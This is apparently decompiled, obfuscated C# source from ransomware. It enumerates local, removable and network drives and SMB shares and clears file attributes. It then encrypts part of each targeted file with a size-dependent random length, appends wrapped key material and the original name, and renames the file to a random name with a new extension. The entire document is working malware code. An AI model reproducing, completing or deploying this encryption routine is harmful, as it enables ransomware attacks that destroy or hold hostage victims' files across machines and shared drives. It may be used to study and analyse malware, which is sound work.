using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public static class GClass9
{
	public static void smethod_0(byte[] byte_0, byte[] byte_1)
	{
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (((driveInfo.IsReady && driveInfo.DriveType != DriveType.CDRom) || driveInfo.DriveType != 0) && GClass6.GClass7.Boolean_9 && driveInfo.DriveType == DriveType.Network)
				{
					smethod_7(driveInfo.Name, byte_0, byte_1);
				}
			}
			logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo2 = new DriveInfo(logicalDrives[i]);
				if (((driveInfo2.IsReady && driveInfo2.DriveType != DriveType.CDRom) || driveInfo2.DriveType != 0) && ((GClass6.GClass7.Boolean_8 && driveInfo2.DriveType == DriveType.Fixed) || (GClass6.GClass7.Boolean_10 && driveInfo2.DriveType == DriveType.Removable && driveInfo2.DriveType != DriveType.Network)))
				{
					smethod_7(driveInfo2.Name, byte_0, byte_1);
				}
			}
			GClass5 gClass5_ = GClass5.GClass5_0;
			if (gClass5_ == null)
			{
				return;
			}
			foreach (object item in gClass5_)
			{
				string text = item.ToString();
				bool flag = false;
				if (!text.Contains("ADMIN$") && !text.Contains("IPC$") && !text.Contains("print$") && !text.Contains("$"))
				{
					flag = true;
				}
				if (flag)
				{
					smethod_7(text, byte_0, byte_1);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	private static void smethod_1(byte[] byte_0, byte[] byte_1)
	{
		try
		{
			if (GClass8.list_0.Count != 0)
			{
				string[] array = GClass8.list_0.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					smethod_9(array[i], byte_0, byte_1, 8, 16);
				}
			}
			GClass8.list_0.Clear();
			if (GClass8.list_1.Count != 0)
			{
				string[] array = GClass8.list_1.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					smethod_9(array[i], byte_0, byte_1, 16, 32);
				}
			}
			GClass8.list_1.Clear();
			if (GClass8.list_2.Count != 0)
			{
				string[] array = GClass8.list_2.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					smethod_9(array[i], byte_0, byte_1, 32, 64);
				}
			}
			GClass8.list_2.Clear();
		}
		catch (Exception)
		{
		}
	}

	private static string[] smethod_2(string string_0)
	{
		try
		{
			return Directory.GetDirectories(string_0);
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static long smethod_3(string string_0)
	{
		try
		{
			return new FileInfo(string_0).Length;
		}
		catch (Exception)
		{
		}
		return 0L;
	}

	private static string[] smethod_4(string string_0)
	{
		try
		{
			return Directory.GetFiles(string_0);
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static bool smethod_5(string string_0)
	{
		try
		{
			if (GClass6.GClass7.String_9.Contains(new FileInfo(string_0).Name.ToLower()))
			{
				return false;
			}
			if (!(GClass6.GClass7.String_12 + "." + GClass6.GClass7.String_13 == new FileInfo(string_0).Name))
			{
				string text = File.GetAttributes(string_0).ToString().ToLower();
				if (text.Contains("system"))
				{
					return false;
				}
				if (text.Contains("hidden") || text.Contains("readonly") || text.Contains("archive"))
				{
					File.SetAttributes(string_0, FileAttributes.Normal);
				}
				if (new FileInfo(string_0).Length >> 10 != 0L)
				{
					if (GClass6.GClass7.Boolean_11 && new FileInfo(string_0).DirectoryName!.Contains("\\\\"))
					{
						return true;
					}
					if (!GClass6.GClass7.String_6.Contains(new FileInfo(string_0).Extension.ToLower().Replace(".", "")))
					{
						if (GClass6.GClass7.Boolean_11 && !(Environment.SystemDirectory.Substring(0, 1) == new FileInfo(string_0).FullName.Substring(0, 1)))
						{
							return true;
						}
						return false;
					}
					return true;
				}
				return false;
			}
			return false;
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static bool smethod_6(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			string text = directoryInfo.Attributes.ToString();
			if (!text.Contains("Hidden") && !text.Contains("System"))
			{
				File.Create(Path.Combine(string_0, "Touch")).Dispose();
				File.Delete(Path.Combine(string_0, "Touch"));
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				if (!(string_0 == Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)) && (!folderPath.Contains("(x86)") || !(string_0 == folderPath.Replace(" (x86)", ""))))
				{
					string[] string_ = GClass6.GClass7.String_10;
					foreach (string text2 in string_)
					{
						if (directoryInfo.Name.ToLower() == text2)
						{
							return false;
						}
					}
					return true;
				}
				return false;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static void smethod_7(string string_0, byte[] byte_0, byte[] byte_1)
	{
		smethod_8(string_0);
		if (!GClass6.GClass7.Boolean_12)
		{
			smethod_1(byte_0, byte_1);
		}
	}

	public static void smethod_8(string string_0)
	{
		try
		{
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			if (files != null)
			{
				string[] array = files;
				foreach (string text in array)
				{
					if (!smethod_5(text))
					{
						continue;
					}
					long num = smethod_3(text) / 1048576L;
					if (GClass6.GClass7.Boolean_12)
					{
						if (num < 10L)
						{
							smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 1, 2);
						}
						else if (num < 20L)
						{
							smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 3, 4);
						}
						else if (num < 30L)
						{
							smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 5, 6);
						}
						else if (num < 40L)
						{
							smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 7, 8);
						}
						else if (num >= 50L)
						{
							if (num < 60L)
							{
								smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 11, 12);
							}
							else if (num < 70L)
							{
								smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 13, 14);
							}
							else if (num < 80L)
							{
								smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 15, 16);
							}
							else if (num >= 90L)
							{
								if (num < 100L)
								{
									smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 19, 20);
								}
								else if (num >= 1000L)
								{
									smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 64, 128);
								}
								else
								{
									smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 32, 64);
								}
							}
							else
							{
								smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 17, 18);
							}
						}
						else
						{
							smethod_9(text, Class7.Class8.Byte_0, Class7.Class8.Byte_1, 9, 10);
						}
					}
					else if (num < 100L)
					{
						GClass8.list_0.Add(text);
					}
					else if (num >= 1000L)
					{
						GClass8.list_2.Add(text);
					}
					else
					{
						GClass8.list_1.Add(text);
					}
				}
			}
			if (directories != null)
			{
				string[] array = directories;
				foreach (string string_ in array)
				{
					if (smethod_6(string_))
					{
						smethod_8(string_);
					}
				}
			}
			Class12.smethod_15(string_0);
		}
		catch (Exception)
		{
		}
	}

	private static bool smethod_9(string string_0, byte[] byte_0, byte[] byte_1, int int_0, int int_1)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				return false;
			}
			int num = 32;
			int num2 = 256;
			int maxValue = int_1 * 1048576;
			int num3 = new Random().Next(int_0, maxValue);
			if (new DriveInfo(string_0.Substring(0, 1) + ":\\").AvailableFreeSpace <= num3 * 2)
			{
				return false;
			}
			if (Encoding.UTF8.GetBytes(new FileInfo(string_0).Name).Length > num2)
			{
				return false;
			}
			byte[] array = Class12.smethod_11(32);
			byte[] array2 = Class9.smethod_1(array, byte_0);
			byte[] array3 = SHA256.Create().ComputeHash(array);
			byte[] array4 = new byte[num3];
			byte[] array5 = new byte[32];
			using (BinaryReader binaryReader = new BinaryReader(File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None)))
			{
				array4 = binaryReader.ReadBytes(array4.Length);
				Buffer.BlockCopy(array4, 0, array5, 0, array5.Length - 16);
				Buffer.BlockCopy(array4, array4.Length - 16, array5, 16, array5.Length - 16);
				array4 = Class9.smethod_0(array4, array, byte_1);
				if (array4 == null)
				{
					return false;
				}
				binaryReader.Close();
			}
			using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_0, FileMode.Open, FileAccess.Write, FileShare.None)))
			{
				binaryWriter.Write(array4, 0, array4.Length);
				binaryWriter.Close();
			}
			byte[] array6 = new byte[num];
			byte[] bytes = Encoding.UTF8.GetBytes(array4.Length.ToString());
			Buffer.BlockCopy(bytes, 0, array6, 0, bytes.Length);
			byte[] array7 = Class12.smethod_11(32);
			byte[] byte_2 = Class12.smethod_4(byte_0, byte_1, 1000, 8);
			byte[] array8 = SHA256.Create().ComputeHash(array7);
			byte[] array9 = Class9.smethod_1(array7, byte_0);
			array6 = Class9.smethod_3(array6, array7, byte_2);
			bytes = null;
			array4 = null;
			byte[] array10 = new byte[num2];
			byte[] bytes2 = Encoding.UTF8.GetBytes(new FileInfo(string_0).Name);
			Buffer.BlockCopy(bytes2, 0, array10, 0, bytes2.Length);
			byte[] array11 = Class12.smethod_11(32);
			byte[] byte_3 = Class12.smethod_4(byte_0, byte_1, 1000, 8);
			byte[] array12 = SHA256.Create().ComputeHash(array11);
			byte[] array13 = Class9.smethod_1(array11, byte_0);
			array10 = Class9.smethod_3(array10, array11, byte_3);
			byte[] array14 = new byte[array5.Length + array2.Length + array3.Length + num + array9.Length + array8.Length + num2 + array13.Length + array12.Length];
			array14 = Class12.smethod_5(array5, array2, array3, array6, array9, array8, array10, array13, array12);
			using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_0, FileMode.Append, FileAccess.Write, FileShare.None)))
			{
				binaryWriter2.Write(array14);
			}
			string text = "";
			text = Class12.smethod_10(16, bool_0: true);
			string text2 = "";
			text2 = $"{new FileInfo(string_0).DirectoryName}\\{text}.{Class7.Class8.String_1}";
			int num4 = 0;
			while (true)
			{
				if (!File.Exists(text2))
				{
					File.Move(string_0, text2);
				}
				if (num4 > 3)
				{
					break;
				}
				num4++;
				if (File.Exists(text2))
				{
					if (!File.Exists(text2))
					{
						return false;
					}
					GClass8.long_0++;
					return true;
				}
			}
			return false;
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (FileNotFoundException)
		{
			return false;
		}
		catch (OutOfMemoryException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
